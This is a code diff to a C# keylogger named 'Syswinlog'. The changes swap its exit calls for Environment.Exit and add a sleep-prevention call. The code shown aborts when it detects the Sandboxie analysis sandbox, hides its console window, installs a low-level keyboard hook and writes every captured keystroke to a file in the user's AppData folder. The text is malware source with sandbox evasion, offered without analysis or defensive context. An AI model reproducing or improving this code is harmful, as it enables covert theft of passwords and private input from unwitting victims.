@@ -21,15 +21,16 @@ namespace Syswinlog
         {
             if ( Utils.IsInstanceRunning() ) {
                 StatusLog.Log("A running instance is already present! [ABORTING]");
-                Application.Exit();
+                Environment.Exit(2);
             }
             if ( Utils.DetectSandboxie() ) {
                 StatusLog.Log("Sandboxie detected! [ABORTING]");
-                Application.Exit();
+                Environment.Exit(2);
             }
 
             Startup.Init();
             StatusLog.Log("Started...");
+            Utils.PreventSleep();
 
             _hookptr = SetHook(KeyBoardProcCallback);
             SetConsoleWindow(Constants.ConsoleWindowState.SW_HIDE);
@@ -85,7 +86,7 @@ namespace Syswinlog
             } else {
                 _internal.Append( "[" + ((Keys)vkey) + "]" );
             }
-             
+
             using (_outfile = new StreamWriter(
                 Utils.GetAppDataFolder() + Constants.KeyLogPath, true, Encoding.Unicode) ) {
                 _outfile.Write(_internal);
